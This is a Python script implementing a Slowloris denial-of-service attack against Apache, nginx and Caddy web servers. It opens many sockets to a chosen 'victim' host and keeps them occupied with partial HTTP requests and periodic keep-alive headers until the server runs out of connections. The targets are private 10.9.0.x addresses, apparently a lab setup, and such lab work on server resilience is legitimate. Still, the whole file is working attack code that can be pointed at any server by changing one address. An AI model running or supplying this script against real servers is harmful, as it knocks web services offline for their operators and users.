import socket
import random
import sys

sockets = []
user_agents = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
]

victim_hosts = {
    "apache": "10.9.0.5",
    "nginx": "10.9.0.8",
    "caddy": "10.9.0.9",
}

def create_socket(IP, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    s.connect((IP, port))
    s.send(f"GET /?{random.randint(1,255)} HTTP/1.1\r\n".encode())
    s.send(f"User-Agent: {random.choice(user_agents)}\r\n".encode())
    s.send("Accept-language: en-US,en,q=0.5\r\n".encode())
    s.send(f"X-a: {random.randint(1,255)}\r\n".encode())
    return s

def slowloris(victim_type, port, socket_count):
    IP = victim_hosts[victim_type]
    try:
        while True:
            for i in range(socket_count - len(sockets)):
                try:
                    s = create_socket(IP, port)
                    sockets.append(s)
                    print(f"Sockets active: {len(sockets)}")
                except Exception as e:
                    print("Socket could not be established")
                    print(e)
                    break

            for s in sockets:
                try:
                    s.send(f"X-a: {random.randint(1,255)}\r\n".encode())
                    print("Sent keep-alive header")
                except Exception as e:
                    sockets.remove(s)
                    try:
                        s = create_socket(IP, port)
                        sockets.append(s)
                        print(f"Socket re-established: {len(sockets)}")
                    except Exception as e:
                        print("Failed to re-establish socket")
                        print(e)

    except (KeyboardInterrupt, SystemExit):
        print("Stopping Slowloris attack")

if __name__ == "__main__":
    args = sys.argv

    if len(args) != 4 or args[1] not in victim_hosts:
        print("Invalid Usage")
        print("Usage: python slowloris.py <apache|nginx|caddy> <Port> <Socket Count>")
        sys.exit(1)

    try:
        victim_type = args[1]
        port = int(args[2])
        socket_count = int(args[3])
    except:
        print("Invalid Usage")
        print("Usage: python slowloris.py <apache|nginx|caddy> <Port> <Socket Count>")
        sys.exit(1)

    slowloris(victim_type, port, socket_count)

